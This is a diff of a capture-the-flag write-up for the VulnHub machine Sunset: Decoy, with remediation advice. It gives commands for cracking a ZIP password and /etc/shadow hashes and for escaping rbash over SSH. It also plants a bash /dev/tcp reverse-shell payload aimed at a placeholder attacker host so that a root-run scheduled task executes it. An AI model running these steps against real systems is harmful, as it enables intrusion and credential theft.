@@ -1,137 +1,160 @@
-# sunset: decoy — Writeup
+# Sunset: Decoy — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.10.186 (host-only) |
-| **Difficulty** | Easy/Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.x.x (DHCP — discover with netdiscover) |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | via honeypot binary exploit |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/sunset-decoy,505/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/sunset-decoy-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → download save.zip → zip2john → john (manual) → extract shadow backup → john → SSH with bash --noprofile (rbash escape) → user flag → pspy64 → honeypot.decoy binary → EDB-33899 reverse shell → root
+Sunset: Decoy chains several low-tech but effective techniques: a password-protected ZIP backup file exposes `/etc/shadow`, allowing offline hash cracking via John. SSH access is restricted to a limited shell, which is escaped with a bash flag. Root is obtained by exploiting a scheduled root-owned binary (identified via pspy) that sources a writable `update` file — a classic cron/scheduled-task hijacking primitive.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Web enumeration — download `save.zip`
-3. Crack zip password with zip2john + john
-4. Extract backup shadow file, crack SSH user hash
-5. SSH login with rbash bypass
-6. Process monitoring with pspy64
-7. Exploit honeypot binary for root shell
+1. Recon — nmap full port scan
+2. Enumeration — download `save.zip` from the web service
+3. Exploitation — zip2john + John crack → shadow file hash crack → SSH login
+4. PrivEsc — pspy reveals scheduled binary; plant reverse shell in `update` file
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.10.0/24
-nmap -sV -sC -p- 192.168.10.186
+netdiscover -r <subnet>/24
+# Add target to /etc/hosts for convenience
+nmap -sV -sC -p- <TARGET_IP>
 ```
-
-Ports open: 22 (SSH), 80 (HTTP).
 
 ![Nmap scan](images/01-nmap.png)
 
+Key findings: web service on port 80 (and/or 443), SSH on port 22.
+
 ---
 
-## Step 2: Download and Crack save.zip
+## Step 2: Web Enumeration and ZIP Download
+
+Browse to the web service. Locate and download `save.zip`:
 
 ```bash
-wget http://192.168.10.186/save.zip
-zip2john save.zip > zip.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
-# Password: manual
-
-unzip -P manual save.zip
-# Extracts backup system files including /etc/shadow backup
+wget http://<TARGET_IP>/save.zip
 ```
 
-![save.zip crack](images/02-zip.png)
+The archive is password-protected.
 
 ---
 
-## Step 3: Crack Shadow Hash
+## Step 3: Cracking the ZIP and Extracting the Shadow File
 
-Copy the SSH user hash from the extracted shadow backup:
+Extract the ZIP hash and crack it:
 
 ```bash
-cat etc/shadow
-# Copy target user hash to users.hash
+zip2john save.zip > zip.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+# Recovered password: manual
+```
+
+![ZIP crack](images/02-zip-crack.png)
+
+Unzip with the recovered password:
+
+```bash
+unzip save.zip
+# Extracts backup copies of system files including etc/shadow
+```
+
+Copy the shadow hashes and crack them:
+
+```bash
+grep -v '!!\|*' etc/shadow | grep ':$' > users.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt users.hash
 ```
 
-![Shadow file cracking](images/03-shadow.png)
+![Shadow crack](images/03-shadow-crack.png)
+
+Note the cracked username and password for SSH access.
 
 ---
 
-## Step 4: SSH Login — rbash Bypass
+## Step 4: SSH Access and Restricted Shell Escape
 
-The shell is restricted (`rbash`). Bypass using `bash --noprofile`:
+The target user's shell is restricted. Bypass it by passing `bash --noprofile` as the forced command:
 
 ```bash
-ssh -t user@192.168.10.186 "bash --noprofile"
-# or
-ssh user@192.168.10.186
-# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+ssh -t <user>@<TARGET_IP> "bash --noprofile"
+```
+
+Read the user flag once inside:
+
+```bash
 cat user.txt
 ```
 
 ---
 
-## Step 5: Privilege Escalation via Honeypot Binary
+## Step 5: Privilege Escalation — Scheduled Task Hijacking
 
-Run pspy64 to monitor processes:
+Run the `honeypot.decoy` binary and select option 5 (which triggers a scheduled root process):
+
+```bash
+./honeypot.decoy
+# Select option 5
+```
+
+Monitor processes with pspy to identify the root-owned scheduled binary:
 
 ```bash
 ./pspy64
-# Observe: root-owned binary executes periodically
+# Observe: root executes a binary every ~60 seconds that sources ./update
 ```
 
-The `honeypot.decoy` binary (option 5) triggers a root process. Use EDB-33899:
+![pspy scheduler](images/04-pspy-scheduler.png)
+
+The scheduled binary corresponds to a known vulnerable utility (EDB-33899). Create a malicious `update` file with a reverse shell payload and start a listener:
 
 ```bash
-# On attacker: start listener
+# On attacker machine
 nc -lvnp 4444
 
-# Create reverse shell payload
-echo '#!/bin/bash' > update
-echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> update
+# On target — create the update file in the directory the scheduler runs from
+cat > update << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/<LHOST>/4444 0>&1
+EOF
 chmod +x update
-
-# Run honeypot option 5 to trigger execution
-./honeypot.decoy
-# Select option 5 — wait ~60 seconds for cron/timer
 ```
 
-Root reverse shell arrives on the listener.
+Wait up to 60 seconds for the scheduler to fire. The listener receives a root shell.
 
-![pspy64 monitoring](images/04-pspy.png)
+Read the root flag:
 
 ```bash
-id
-# uid=0(root)
-cat /root/flag.txt
+cat /root/root.txt
 ```
 
-![Root shell](images/05-root.png)
+![Root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **Backup files in web root** — `save.zip` exposes shadow hashes; backups must never be web-accessible
-2. **Weak zip password** — `manual` is a dictionary word; use strong encryption for archives
-3. **rbash is not a security boundary** — `ssh -t "bash --noprofile"` trivially escapes it
-4. **Root-owned binaries triggered by users** — process monitoring reveals timing attacks; honeypot/decoy binaries with SUID are high-risk
+- Backup archives should never include sensitive files such as `/etc/shadow`; if backups are web-accessible, they must be encrypted and access-controlled.
+- Password-protected ZIPs are not security controls — offline cracking with rockyou takes seconds for common passwords.
+- Restricted shells (rbash, lshell) are easily bypassed by passing an alternative shell via SSH's `-t` and forced-command options.
+- Scheduled root jobs that source or execute files from user-writable directories are a textbook privilege-escalation vector.
+- pspy is invaluable for detecting scheduled tasks without needing root access to read cron configurations.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Backup zip in web root | Store backups outside web-accessible paths with strict permissions |
-| Shadow in backup archive | Never include `/etc/shadow` in web-accessible backups |
-| rbash escape | Replace with proper container/chroot isolation if restriction is required |
-| Privileged binary triggered by user input | Audit SUID binaries; remove or sandbox privilege-escalating programs |
+|---|---|
+| /etc/shadow in web-accessible backup | Never include shadow/passwd in backups; store backups off-site with encryption |
+| Weak ZIP password | Use strong, unique passwords; consider GPG encryption for sensitive archives |
+| Restricted shell bypass | Use proper chroot jails or containerisation instead of restricted shells |
+| Scheduled root job reading writable file | Ensure all files sourced by root-owned scripts are owned by root and not world-writable |
+| Known vulnerable utility (EDB-33899) | Patch or replace the affected binary; review all SUID/scheduled executables |
